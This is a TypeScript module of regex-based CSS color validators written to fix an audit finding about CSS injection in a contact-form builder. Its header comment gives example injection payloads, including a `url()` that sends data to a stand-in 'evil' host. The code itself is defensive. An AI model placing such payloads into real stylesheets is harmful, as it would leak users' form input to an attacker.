// CSS value validators for config-driven styles.
//
// Audit P1-4: ContactFormBuilderLive renders a `<style dangerouslySetInnerHTML>`
// block that interpolates user-controlled colors into `@keyframes` rules. If
// the colors aren't validated, an attacker who can edit the contact-form
// config can inject CSS that reads form inputs via attribute selectors or
// pulls remote URLs (e.g. `url('javascript:...')`, `url('https://evil/...?v=')`).
//
// These helpers whitelist common color formats. Anything outside the regex
// falls back to a caller-provided safe default.

const HEX_RE = /^#[0-9A-Fa-f]{3,8}$/
const RGB_RE = /^rgb\(\s*\d+\s*,\s*\d+\s*,\s*\d+\s*\)$/
const RGBA_RE = /^rgba\(\s*\d+\s*,\s*\d+\s*,\s*\d+\s*,\s*(?:\d+(?:\.\d+)?|\.\d+)\s*\)$/
const HSL_RE = /^hsl\(\s*\d+(?:\.\d+)?\s*,\s*\d+(?:\.\d+)?%\s*,\s*\d+(?:\.\d+)?%\s*\)$/
const HSLA_RE = /^hsla\(\s*\d+(?:\.\d+)?\s*,\s*\d+(?:\.\d+)?%\s*,\s*\d+(?:\.\d+)?%\s*,\s*(?:\d+(?:\.\d+)?|\.\d+)\s*\)$/
const NAMED_RE = /^(?:transparent|currentColor|inherit|initial|unset|black|white|red|green|blue|yellow|orange|purple|pink|gray|grey)$/i

export function isSafeCssColor(value: unknown): value is string {
  if (typeof value !== 'string') return false
  const v = value.trim()
  if (v.length === 0 || v.length > 64) return false
  return (
    HEX_RE.test(v) ||
    RGB_RE.test(v) ||
    RGBA_RE.test(v) ||
    HSL_RE.test(v) ||
    HSLA_RE.test(v) ||
    NAMED_RE.test(v)
  )
}

export function toSafeCssColor(value: unknown, fallback: string): string {
  return isSafeCssColor(value) ? value : fallback
}
